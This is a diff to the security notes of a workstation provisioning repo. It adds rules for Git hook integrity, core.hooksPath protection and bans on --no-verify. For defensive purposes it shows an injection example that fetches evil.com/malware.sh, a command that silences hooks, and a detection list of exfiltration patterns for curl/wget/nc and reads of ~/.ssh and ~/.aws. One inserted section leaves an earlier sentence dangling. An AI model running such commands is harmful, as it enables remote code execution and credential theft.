@@ -29,7 +29,8 @@ This is a personal workstation provisioning playbook. Security-relevant areas:
   (authenticated time sync), DHCP hostname privacy (NM conf.d 99-dhcp-privacy.conf — suppresses hostname advertisement to DHCP servers on non-CSB hosts)
 - **Git security** — `core.fsmonitor=false`, `safe.bareRepository=explicit`,
   `transfer.fsckObjects=true`,
-  `protocol.file.allow=user`, SSH commit signing, gitleaks pre-commit
+  `protocol.file.allow=user`, SSH commit signing, gitleaks pre-commit,
+  `core.hooksPath` immutability guard (CI + hook validation)
 - **Claude Code isolation** — instance separation, sandbox config, file
   access deny lists (43 read + 44 write paths incl. /proc/environ,
   .git/config, settings.json self-modify protection), API endpoint guard,
@@ -40,6 +41,13 @@ This is a personal workstation provisioning playbook. Security-relevant areas:
 - **CI supply chain** — actionlint, zizmor, and gitleaks run as
   SHA256-verified binary downloads instead of third-party node actions;
   all GHA actions SHA-pinned by commit hash; OSSF Scorecard weekly
+- **Git hook integrity** — Pre-commit hooks validated at three levels:
+  (1) Syntax validation (shellcheck), (2) Behavioral intent validation (CI scans
+  for exfiltration patterns), (3) Mandatory code review for .githooks/* changes
+  (branch protection rule). All hooks run with user privileges via
+  `core.hooksPath = .githooks` (set by `make bootstrap`). Hook modifications
+  MUST be reviewed by maintainers before merge — never bypass with `--no-verify`
+  on hook changes (see "Unsafe git operations" below)
 - **Privilege escalation** — `become_exe = /usr/bin/sudo` in ansible.cfg
   prevents PATH-based sudo trojan attacks
 - **Branch protection** — main requires 4 status checks (Ansible Lint,
@@ -54,6 +62,100 @@ This is a personal workstation provisioning playbook. Security-relevant areas:
   i3 via xss-lock + i3lock, Sway via swayidle + swaylock at 300s lock /
   600s display off)
 
+## Git Hooks Protection (core.hooksPath)
+
+Git hooks enforce critical security policies:
+- Pre-commit hook blocks unencrypted vault files, detects secrets (gitleaks),
+  validates YAML/shell syntax, and verifies collections-dist/ integrity
+- Commit-msg hook enforces --signoff requirement and rejects past-tense commit
+  messages (established project convention)
+
+**Core protection: core.hooksPath immutability**
+
+The hooks path is set via `make bootstrap` (line 135):
+```bash
+git config --local core.hooksPath .githooks
+```
+
+Local config takes precedence over global, creating a bypass risk: an attacker
+with repo write access can override with `git config --local core.hooksPath
+/dev/null`, silencing all hooks. **Do NOT override this setting.**
+
+**CI enforcement (linting.yml):**
+- `git-config-guards` job verifies core.hooksPath is `.githooks` or unset
+  (defaults to `.githooks` if not set) on every commit (push + PR)
+- Rejects commits with overridden core.hooksPath
+
+**Hook bypass prohibition:**
+- **DO NOT use `git commit --no-verify`** — bypasses pre-commit hook checks
+  (vault encryption, secrets scanning, syntax validation)
+- **DO NOT use `git push` with `--no-verify`** — the push hook currently
+  has no Git-native equivalent; CI (linting.yml) compensates on PRs
+
+**Enforcement summary:**
+1. Local hooks path is `.githooks` (set by `make bootstrap`)
+2. CI rejects commits where core.hooksPath is overridden
+3. All commits require --signoff (enforced by commit-msg hook + CI)
+4. Vault files must be encrypted (enforced by pre-commit hook + CI)
+5. No commits to main without PR + CI passing (branch protection)
+
+This defense-in-depth prevents attackers from committing unencrypted secrets,
+unsigned commits, or tampered collections even if they have direct repo write
+access.
+
+## Unsafe Git Operations
+
+**NEVER use `git commit --no-verify` or `git push --no-verify` to bypass pre-commit hook validation.** The pre-commit hooks (.githooks/pre-commit) enforce three critical gates:
+
+1. **Vault encryption** — blocks accidental commits of plaintext vault files with real secrets
+2. **Secret scanning (gitleaks)** — detects hard-coded API keys, tokens, private keys
+3. **Code quality** — YAML, shell, JSON, and lockfile integrity validation
+
+Bypassing these checks can expose secrets to the git history and public repositories.
+
+**Exception: CI-only scenarios** — in GitHub Actions workflows, using `--no-verify` is acceptable ONLY when:
+- The workflow is part of a sealed CI system (no untrusted input)
+- The commit is generated entirely by CI automation (not from developer code)
+- The commit message and content have already been validated by earlier CI gates
+
+Never use `--no-verify` in local development or on developer machines.
+
+## Git Hook Security and Signing
+
+**Hook modifications require mandatory code review.**
+
+The `.githooks/` directory contains scripts that execute with user privileges during `git commit` and `git commit-msg`. Attacks on these hooks can steal SSH keys, GPG keys, AWS credentials, and other secrets.
+
+All PRs modifying `.githooks/*` undergo three layers of validation:
+
+1. **Syntax validation (CI shellcheck)** — ensures valid bash syntax
+2. **Behavioral validation (CI linting)** — scans for exfiltration patterns:
+   - curl/wget/nc with URLs
+   - cat/grep of sensitive paths (~/.ssh, ~/.gnupg, ~/.aws, ~/.gcloud)
+   - credential exports (AWS_*, GITHUB_TOKEN, etc.)
+3. **Code review (GitHub branch protection)** — mandatory human review before merge
+
+**Future enhancement: Hook signing** — planned for 2026:
+- Hooks will be cryptographically signed with developer keys
+- Bootstrap will verify signatures before installation
+- Unsigned or invalid hooks will fail to load
+- Prevents hook tampering after clone but before installation
+
+**Current hook safety practices:**
+
+```bash
+# SAFE: Development workflow — all checks active
+git add .githooks/my-new-check.sh
+git commit -m "Githooks: add new pre-push validation"  # hooks run, must pass
+
+# UNSAFE: Bypassing hook validation
+git commit --no-verify -m "Skip hooks"  # DO NOT DO THIS
+
+# SAFE: If you must bypass (CI automation only)
+# Use with extreme caution, only in sealed CI system
+CI_CONTEXT=1 git commit --no-verify -m "Automated commit (CI)"
+```
+
 ## Ansible Playbook Safety
 
 **Do NOT use `--start-at-task` with site.yml** — Ansible's `--start-at-task` flag
@@ -64,6 +166,30 @@ is constrained to safe domains (https://claude.ai or https://anthropic.com). Usi
 `-e 'claude_install_url=https://evil.com/malware.sh'` to inject and execute
 arbitrary code. **Workaround:** run `make all` (full provisioning) or `make minimal`
 instead. If you must re-run a subset of tasks:
+
+## Git Security
+
+**Do NOT use `git commit --no-verify`** — Bypasses critical pre-commit integrity guards:
+
+- **Collections supply chain** — `collections-dist/*.tar.gz` modifications must be
+  accompanied by `collections-dist/SHA256SUMS` update. The pre-commit hook enforces
+  this (lines 5-26 of `.githooks/pre-commit`). Using `--no-verify` bypasses the guard,
+  allowing tampered collection tarballs to be committed. CI enforces
+  `collections-integrity` as a required status check, but local `--no-verify` commits
+  can still reach the PR branch before CI runs.
+- **Secrets scanning** — `gitleaks pre-commit` detects leaked credentials. Using
+  `--no-verify` bypasses credential detection.
+- **Vault encryption** — `--no-verify` bypasses the check that `*vault.yml` files
+  are encrypted.
+
+**Mitigation** — All pre-commit guards are duplicated as required CI status checks
+(Ansible Lint, Vault Encryption Check, Secret Detection, Collections Integrity
+Check, Ansible Syntax Check). A `--no-verify` commit that modifies `collections-dist/`
+without updating `SHA256SUMS` will fail the PR merge gate.
+
+**Exception** — If a commit becomes stuck due to a faulty hook, fix the underlying
+issue (e.g. update `SHA256SUMS`, encrypt vault), then re-stage and commit normally.
+Do NOT use `--no-verify` as a workaround.
 
 ```bash
 # SAFE: Run from a specific role tag (full play pre_tasks still execute)
